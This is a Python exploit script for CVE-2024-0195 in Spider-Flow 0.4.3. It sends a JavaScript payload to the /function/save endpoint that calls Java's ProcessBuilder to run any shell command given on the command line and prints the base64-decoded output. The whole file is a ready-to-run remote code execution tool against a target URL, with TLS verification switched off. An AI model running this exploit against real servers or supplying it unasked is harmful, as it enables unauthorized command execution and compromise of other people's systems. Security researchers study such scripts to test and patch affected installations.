#!/usr/bin/env python3
"""
Spider-Flow 0.4.3 Remote Code Execution Exploit (CVE-2024-0195)
This exploit demonstrates the code injection vulnerability in the FunctionService.saveFunction method.
"""

import requests
import json
import sys
import argparse
import urllib.parse

class SpiderFlowExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.function_save_url = f"{self.target_url}/function/save"

    def create_payload(self, cmd):
        # Encode command to prevent issues with special characters
        encoded_cmd = urllib.parse.quote(cmd)

        js_payload = f"""
        var Runtime = Java.type('java.lang.Runtime');
        var ProcessBuilder = Java.type('java.lang.ProcessBuilder');
        var Base64 = Java.type('java.util.Base64');
        var String = Java.type('java.lang.String');

        function executeCommand(cmd) {{
            try {{
                // Create process builder with command
                var pb = new ProcessBuilder('/bin/sh', '-c', cmd);
                pb.redirectErrorStream(true);

                // Start process and get input stream
                var process = pb.start();
                var input = process.getInputStream();

                // Read output
                var output = new java.io.ByteArrayOutputStream();
                var buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
                var length;
                while ((length = input.read(buffer)) != -1) {{
                    output.write(buffer, 0, length);
                }}

                // Wait for process to complete
                process.waitFor();

                // Return base64 encoded output
                return new String(Base64.getEncoder().encode(output.toByteArray()));
            }} catch(e) {{
                return "Error: " + e.message;
            }}
        }}

        executeCommand('{encoded_cmd}');
        """
        return js_payload

    def exploit(self, cmd):
        try:
            # Prepare the payload
            data = {
                'name': 'test_function',
                'parameter': '',
                'script': self.create_payload(cmd)
            }

            # Send the exploit
            print("[*] Sending exploit to " + self.function_save_url)
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': 'application/json, text/plain, */*'
            }

            response = requests.post(
                self.function_save_url,
                data=data,
                headers=headers,
                verify=False  # For testing purposes only
            )

            # Check if the request was successful
            if response.status_code == 200:
                print("[+] Exploit sent successfully")

                # Try to decode base64 response
                try:
                    if response.text and not "error" in response.text.lower():
                        import base64
                        output = base64.b64decode(response.text.strip('"')).decode('utf-8')
                        print("\n=== Command Output ===")
                        print(output)
                    else:
                        print("[-] Error in response:")
                        print(response.text)
                except Exception as e:
                    print("[-] Failed to decode response:")
                    print(response.text)
            else:
                print(f"[-] Failed to send exploit. Status code: {response.status_code}")
                print(response.text)

        except Exception as e:
            print(f"[-] Error during exploitation: {str(e)}")
            raise

def main():
    parser = argparse.ArgumentParser(description='Spider-Flow 0.4.3 RCE Exploit (CVE-2024-0195)')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., http://localhost:8088)')
    parser.add_argument('-c', '--command', required=True, help='Command to execute')
    args = parser.parse_args()

    exploit = SpiderFlowExploit(args.url)
    exploit.exploit(args.command)

if __name__ == "__main__":
    main()
